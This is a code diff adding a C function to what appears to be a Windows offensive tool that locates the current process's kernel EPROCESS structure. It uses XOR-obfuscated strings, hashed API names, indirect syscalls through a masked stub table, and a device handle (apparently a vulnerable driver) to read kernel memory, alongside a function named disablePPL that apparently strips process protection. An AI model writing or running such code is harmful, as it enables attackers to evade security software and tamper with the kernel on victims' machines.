@@ -178,6 +178,113 @@ DWORD GetExportRvaByHash(PVOID pRawPeBuffer, DWORD64 dwTargetHash) {
   return 0;
 }
 
+DWORD64 GetMyEprocAddress(HANDLE Device) {
+  Offsets offs = getOffsets();
+  if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 ||
+      offs.ObjectTable == 0) {
+    return 0;
+  }
+
+  DWORD64 ntBase = getKBAddr();
+  if (ntBase == 0)
+    return 0;
+
+  const unsigned char ps_enc[] = {
+      0x60, 0x42, 0x7B, 0x5D, 0x5D, 0x41, 0x5F, 0x56, 0x54, 0x6A, 0x18,
+      0x11, 0x17, 0x01, 0x08, 0x36, 0x15, 0x07, 0x0A, 0x0F, 0x43, 0x42};
+  char *ps_str = xor_decrypt_string(ps_enc, sizeof(ps_enc), XOR_KEY, key_len);
+
+  UNICODE_STRING usNtPath;
+  usNtPath.Buffer = L"\\??\\C:\\Windows\\System32\\ntoskrnl.exe";
+  USHORT strLen = 0;
+  while (usNtPath.Buffer[strLen] != L'\0') {
+    strLen++;
+  }
+  usNtPath.Length = strLen * 2;
+  usNtPath.MaximumLength = usNtPath.Length + 2;
+
+  OBJECT_ATTRIBUTES oaNtFile;
+  InitializeObjectAttributes(&oaNtFile, &usNtPath, OBJ_CASE_INSENSITIVE, NULL,
+                             NULL);
+
+  IO_STATUS_BLOCK ioStatusBlock;
+  HANDLE hFile = NULL;
+  DWORD64 hNtOpenF = djb2((PBYTE) "NtOpenFile");
+  DWORD64 hNtReadF = djb2((PBYTE) "NtReadFile");
+  DWORD64 hNtCloseS = djb2((PBYTE) "NtClose");
+
+  int idxOpenFile = -1, idxReadFile = -1, idxClose = -1;
+  for (DWORD i = 0; i < SyscallList.Count; i++) {
+    if (SyscallList.Entries[i].dwHash == hNtOpenF)
+      idxOpenFile = (int)i;
+    if (SyscallList.Entries[i].dwHash == hNtReadF)
+      idxReadFile = (int)i;
+    if (SyscallList.Entries[i].dwHash == hNtCloseS)
+      idxClose = (int)i;
+  }
+
+  if (idxOpenFile == -1 || idxReadFile == -1 || idxClose == -1) {
+    custom_free(ps_str);
+    return 0;
+  }
+
+  PBYTE pStubBase = (PBYTE)&Fnc0000;
+  fnNtOpenFile pNtOpenFile = (fnNtOpenFile)(pStubBase + (idxOpenFile * 16));
+  fnNtReadFile pNtReadFile = (fnNtReadFile)(pStubBase + (idxReadFile * 16));
+  fnNtClose pNtClose = (fnNtClose)(pStubBase + (idxClose * 16));
+
+  NTSTATUS status = ExecuteSyscall(
+      pNtOpenFile, Mask_Worker, &hFile, FILE_READ_DATA | SYNCHRONIZE, &oaNtFile,
+      &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
+  if (status != 0) {
+    custom_free(ps_str);
+    return 0;
+  }
+
+  DWORD fileSize = 15000000;
+  PVOID pBuffer = custom_malloc(fileSize);
+  LARGE_INTEGER byteOffset;
+  byteOffset.QuadPart = 0;
+
+  status = ExecuteSyscall(pNtReadFile, Mask_Worker, hFile, NULL, NULL, NULL,
+                          &ioStatusBlock, pBuffer, fileSize, &byteOffset, NULL);
+  ExecuteSyscall(pNtClose, Mask_Worker, hFile);
+
+  if (status != 0 || !pBuffer) {
+    if (pBuffer)
+      custom_free(pBuffer);
+    custom_free(ps_str);
+    return 0;
+  }
+
+  DWORD64 psHashTarget = djb2((PBYTE)ps_str);
+  DWORD64 ps_offset = GetExportRvaByHash(pBuffer, psHashTarget);
+
+  custom_free(ps_str);
+  custom_free(pBuffer);
+
+  if (ps_offset == 0)
+    return 0;
+
+  DWORD64 sys_eproc = ReadMemoryDWORD64(Device, ntBase + ps_offset);
+  DWORD64 list_head = sys_eproc + offs.ActiveProcessLinks;
+  DWORD64 curr_entry = ReadMemoryDWORD64(Device, list_head);
+
+  DWORD myPid = GetCurrentProcessId();
+
+  while (curr_entry != list_head) {
+    DWORD64 eproc = curr_entry - offs.ActiveProcessLinks;
+    DWORD64 readPid =
+        ReadMemoryDWORD64(Device, eproc + offs.ActiveProcessLinks - 8);
+
+    if (readPid == myPid) {
+      return eproc;
+    }
+    curr_entry = ReadMemoryDWORD64(Device, curr_entry);
+  }
+  return 0;
+}
+
 void disablePPL() {
   Offsets offs = getOffsets();
   if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 ||
